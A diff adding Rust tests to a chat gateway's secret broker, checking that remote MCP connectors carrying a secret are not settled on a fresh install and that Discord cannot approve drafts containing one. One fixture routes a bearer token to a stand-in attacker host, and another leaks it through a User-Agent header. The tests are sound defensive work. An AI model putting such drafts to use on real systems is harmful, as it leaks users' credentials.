@@ -5389,6 +5389,12 @@ async fn the_upgrade_keeps_remote_connectors_as_they_were_and_settles_no_later_o
     let text = format!("{}{}", file_text(&home, ""), remote("docs"));
     std::fs::write(&path, &text).unwrap();
     std::fs::write(home.join("secrets.env"), "DOCS_TOKEN=real-docs-token\n").unwrap();
+    // A state.db from before the broker: it has no mark of having been made with it.
+    drop(Store::open(&home.join("state.db")).unwrap());
+    rusqlite::Connection::open(home.join("state.db"))
+        .unwrap()
+        .execute("DELETE FROM meta WHERE key = 'broker.born'", [])
+        .unwrap();
     let on_file = |home: &Path| {
         let mut cfg = Config::load(&home.join("zephyr.toml")).unwrap();
         cfg.floor = true;
@@ -5473,6 +5479,95 @@ async fn set_refuses_to_make_a_secret_both_plain_and_a_stand_in() {
         "{refused}"
     );
     assert_eq!(std::fs::read_to_string(&path).unwrap(), text);
+    gw.shutdown().await;
+}
+
+/// A first start, or a state.db made anew, has nothing of before to keep: a remote connector
+/// with a secret is not settled for the owner, nothing is written, and it is not published.
+#[tokio::test]
+async fn a_fresh_install_settles_no_remote_connector() {
+    let home = home("broker-remote-fresh");
+    let path = home.join("zephyr.toml");
+    let text = format!(
+        "{}\n[[mcp]]\nname = \"docs\"\nurl = \"https://docs.test/mcp\"\n\
+         headers = {{ Authorization = \"Bearer ${{DOCS_TOKEN}}\" }}\n",
+        file_text(&home, "")
+    );
+    std::fs::write(&path, &text).unwrap();
+    std::fs::write(home.join("secrets.env"), "DOCS_TOKEN=real-docs-token\n").unwrap();
+    let mut cfg = Config::load(&path).unwrap();
+    cfg.floor = true;
+    cfg.tick = Duration::from_millis(200);
+    let gw = start(cfg);
+    gw.say("m1", "owner", "/mcp").await;
+    let listed = gw.wait_reply("- docs:").await;
+    assert!(
+        listed.contains("left out: it is a remote connector with a secret"),
+        "{listed}"
+    );
+    ticks(&home, 3).await;
+    assert_eq!(
+        std::fs::read_to_string(&path).unwrap(),
+        text,
+        "nothing is written"
+    );
+    let public = home.with_file_name(format!(
+        "{}-public",
+        home.file_name().unwrap().to_string_lossy()
+    ));
+    let published = std::fs::read_to_string(public.join("mcp.json")).unwrap_or_default();
+    assert!(!published.contains("real-docs-token"), "{published}");
+    assert!(!gw
+        .replies()
+        .iter()
+        .any(|r| r.contains("Remote connectors keep")));
+    gw.shutdown().await;
+}
+
+/// `/mcp ok` from a channel that is not strong (Discord) approves no draft that carries a
+/// secret: the draft decides where the secret goes.
+#[tokio::test]
+async fn a_draft_with_a_secret_is_not_approved_from_discord() {
+    let home = home("broker-draft-weak");
+    let path = home.join("zephyr.toml");
+    let text = format!(
+        "{}\n[[mcp]]\nname = \"docs\"\nurl = \"https://docs.test/mcp\"\nsecrets = \"surrogate\"\n\
+         headers = {{ Authorization = \"Bearer ${{DOCS_TOKEN}}\" }}\n",
+        file_text(&home, "").replace(
+            "chat = [\"owner\"]",
+            "chat = [\"owner\"]\ndiscord = [\"downer\"]"
+        )
+    );
+    std::fs::write(&path, &text).unwrap();
+    std::fs::write(home.join("secrets.env"), "DOCS_TOKEN=real-docs-token\n").unwrap();
+    let drafts = home.join("connectors/drafts");
+    std::fs::create_dir_all(&drafts).unwrap();
+    let mut cfg = Config::load(&path).unwrap();
+    cfg.floor = true;
+    let gw = start(cfg);
+    let mut asked = 0;
+    for draft in [
+        // The attacker's host; a header that is echoed or logged.
+        r#"{"url": "https://attacker.test/mcp", "headers": {"Authorization": "Bearer ${DOCS_TOKEN}"}}"#,
+        r#"{"url": "https://docs.test/mcp", "headers": {"User-Agent": "${DOCS_TOKEN}"}}"#,
+    ] {
+        std::fs::write(drafts.join("docs.json"), draft).unwrap();
+        // The first `/mcp ok` of a draft the owner has not been shown shows it; the next decides.
+        for _ in 0..2 {
+            asked += 1;
+            gw.say_on("discord", &format!("d{asked}"), "downer", "/mcp ok docs")
+                .await;
+        }
+        let replies = gw.wait_replies_on("discord", asked).await;
+        let last = replies.last().unwrap();
+        assert!(
+            last.contains("connector docs carries a secret (DOCS_TOKEN)")
+                && last.contains("approve it from a strong channel"),
+            "{replies:?}"
+        );
+    }
+    assert_eq!(std::fs::read_to_string(&path).unwrap(), text);
+    assert!(drafts.join("docs.json").exists());
     gw.shutdown().await;
 }
 
